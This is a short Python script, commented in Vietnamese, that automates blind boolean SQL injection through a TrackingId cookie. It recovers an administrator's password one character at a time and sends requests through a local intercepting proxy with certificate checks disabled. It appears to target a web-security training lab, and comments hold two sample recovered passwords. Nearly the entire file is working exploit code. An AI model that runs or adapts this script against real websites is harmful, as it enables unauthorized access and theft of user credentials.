import sys
import requests
import urllib3
import urllib 
import string
import warnings
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# Tắt cảnh báo về các yêu cầu không an toàn
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Trích xuất mật khẩu của quản trị viên bằng SQL injection.
def sqli_password(url, trackingId, sessionId, username, pass_length, hint):
	warnings.simplefilter('ignore',InsecureRequestWarning)
	req = requests.Session()
	

	password = ""   # ag2yj74y5ng8k1uvbxni // length 21
                	# kthtccl0eonf2ki7z3ew 
	index = 1 

	#For debugging
	proxies = {
	    'http':'http://127.0.0.1:8080', 
	    'https':'http://127.0.0.1:8080',
	    }
	pass_length = int(pass_length)
	while index <= pass_length:
		for char in string.ascii_letters + string.digits: # a-z,A-Z,0-9
			sys.stdout.write(f"\r[+] Password: {password}{char}")
			cookies = {
				"session" : f"{sessionId}",
				"TrackingId" : f"{trackingId}' AND SUBSTRING((SELECT password FROM users WHERE username = '{username}'),{index},1) = '{char}",
				}
			resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
			if hint in resp.text:
				password = password + char
				index = index + 1
				break
def main():
    # Kiểm tra xem số lượng đối số dòng lệnh có đúng không
    url = input ("Nhap trang web: ")
    trackingId = input("Nhap TrackingId: ")
    sessionId = input("Nhap session: ")
    username = input ("Nhap username: ")
    pass_length = input("Nhap do dai password: ")
    hint = input("Nhap dau hieu: ")
    print("(+) Đang trích xuất mật khẩu quản trị viên...")
    sqli_password(url, trackingId, sessionId, username, pass_length, hint) # Trích xuất mật khẩu

if __name__ == "__main__":
    main()
